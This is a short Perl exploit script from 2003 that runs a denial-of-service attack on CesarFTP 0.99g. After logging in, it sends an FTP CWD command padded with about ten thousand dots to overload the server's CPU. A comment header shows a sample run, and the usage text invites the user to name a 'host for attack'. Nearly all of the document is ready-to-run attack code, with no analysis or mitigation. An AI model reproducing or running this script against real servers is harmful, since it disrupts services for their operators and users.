#!/usr/bin/perl -w
use IO::Socket;

########################################
#            _   _
#      ____ (_) | |__
#     |_  / | | | '_ \
#      / /  | | | |_) |
#     /___| |_| |_.__/
#
#   http://coding.romainl.com/
#
########################################
##
########################################
## tested on CesarFTP 0.99g + WindowsXP Sp1
##
## server : 127.0.0.1
## user   : zib
## pass   : zib
##
##$ perl expl.pl localhost zib zib
##
##server : localhost
##user   : zib
##pass   : zib
##
##[~] prepare to connect...
##[+] connected
##[~] prepare to send data...
##[+] success
##[~] Send CPU Overload Sequence...
##[+] CPU Overload Sequence sent
##$
########################################

if (@ARGV < 3)
{
print "#############################################################\n";
print " CesarFTP 0.99g : CPU Overload\n";
print " by zib  http://coding.romainl.com/ \n";
print " 22/12/03\n";
print "#############################################################\n";
print " Usage:\n";
print " cesar0.99g_dos.pl <host> <user> <pass>\n";
print "\n";
print " <host> - host for attack\n";
print " <user> - a valid ftp user account, could be anonymous\n";
print " <pass> - pass for the login\n";
print "#############################################################";
exit();
}

$server = $ARGV[0];
$user = $ARGV[1];
$pass = $ARGV[2];
$nb   = 10000;

print "\n";
print "server : $server\n";
print "user   : $user\n";
print "pass   : $pass\n";
print "\n";
$i = 0;
print "[~] prepare to connect...\n";
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort

=> "21") ||
die "[-] connect failed\n";
print "[+] connected\n";
print "[~] prepare to send data...\n";
print $socket "USER $user\n";
print $socket "PASS $pass\n";
print "[+] success\n";
print "[~] Send CPU Overload Sequence...\n";
print $socket "CWD ";
for($i=0;$i<=$nb;$i=$i+1)
{
 print $socket ".";
}
 print $socket "\n";

print "[+] CPU Overload Sequence sent\n";


